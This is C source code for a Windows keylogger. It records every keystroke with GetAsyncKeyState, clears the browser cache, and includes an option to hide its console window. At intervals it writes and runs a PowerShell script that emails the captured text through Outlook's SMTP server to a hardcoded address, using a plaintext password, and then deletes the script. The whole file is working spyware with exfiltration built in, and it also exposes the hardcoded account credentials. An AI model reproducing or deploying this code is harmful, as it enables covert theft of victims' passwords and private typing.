#include <stdio.h>
#include <windows.h>
#include <direct.h>
#include <Winuser.h>
#include <time.h>
#include "clearCache.h"

void save(char i, char *input)
{
    switch (i)
    {
    case VK_BACK:
        strcat(input, " [BackSpace] ");
        break;
    case VK_LBUTTON:
        strcat(input, " [Left Click] ");
        break;
    case VK_RBUTTON:
        strcat(input, " [R click] ");
    case VK_SPACE:
        strcat(input, " ");
        break;
    case VK_CAPITAL:
        strcat(input, " [CAPS] ");
        break;
    case VK_SHIFT:
        strcat(input, " [SHIFT] ");
        break;
    case VK_RETURN:
        strcat(input, "\n");
        break;
    case VK_ESCAPE:
        strcat(input, " [Esc] ");
        break;
    case VK_LEFT:
        strcat(input, " [Left] ");
        break;
    case VK_UP:
        strcat(input, " [UP] ");
        break;
    case VK_RIGHT:
        strcat(input, " [UP] ");
        break;
    default:
        char temp[2];
        temp[0] = i;
        temp[1] = '\0';
        strcat(input, temp);
        printf("%c ", i);
    }
}

void sendEmail(char *input)
{
    FILE *fp = fopen("Keylogger.ps1", "ab+");
    fprintf(fp, "$Myemail=\"letsrememberthis47@outlook.com\"\n");
    fprintf(fp, "$Mypass=\"@Imacoolguy69\"\n");
    fprintf(fp, "$SMTP=\"smtp-mail.outlook.com\"\n");
    fprintf(fp, "$Toemail=\"letsrememberthis47@outlook.com\"\n");
    fprintf(fp, "$Subject=\"KEYLOGGER\";\n");
    fprintf(fp, "$Body=");
    fprintf(fp, " \"%s\"\n", input);
    fprintf(fp, "$SecurePassword=ConvertTo-SecureString -String $Mypass -AsPlainText -Force\n");
    fprintf(fp, "$MyCredentials=New-Object System.Management.Automation.PSCredential $Myemail,$SecurePassword\n");
    fprintf(fp, "Send-MailMessage -To $Toemail -From $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSsl -Port 587 -DeliveryNotificationOption Never\n");
    fclose(fp);

    char *syscall = (char *)malloc(100 * sizeof(char));
    syscall[0] = '\0';
    strcat(syscall, "powershell \"");
    char *path;
    path = _getcwd(NULL, 0);
    strcat(syscall, path);
    strcat(syscall, "\\Keylogger.ps1\"");
    system(syscall);
    remove("Keylogger.ps1");
}

DWORD WINAPI ThreadFunc(void *data)
{
    char *threadinput = (char *)malloc(1500 * sizeof(char));
    threadinput[0] = '\0';
    FILE *fp = fopen("temp.txt", "r");
    while (fgets(threadinput, 1500, fp) != NULL);
    fclose(fp);
    remove("temp.txt");
    sendEmail(threadinput);
    free(threadinput);
    return 0;
}

int main(void)
{
    // FreeConsole(); //hides terminal
    clearBrowserCache();
    int counter = 0;
    char *input = (char *)malloc(1500 * sizeof(char));
    input[0] = '\0';

    time_t start, end;
    start = time(0);

    while (1)
    {
        for (char i = 8; i <= 190; i++)
        {
            SHORT key = GetAsyncKeyState(i);
            if (key & 0x01) // key binary -1111.. 0x01 binary 0000..1 & == 00001 = 1
            {
                counter++;
                save(i, input);
                end = time(0);
                if (counter > 50 && difftime(end, start) > 10)
                {

                    FILE *fp = fopen("temp.txt", "ab+");
                    fprintf(fp, "%s", input);
                    fclose(fp);
                    HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
                    counter = 0;
                    free(input);
                    input = (char *)malloc(1500 * sizeof(char));
                    input[0] = '\0';
                    start = time(0);
                }
            }
        }
    }
}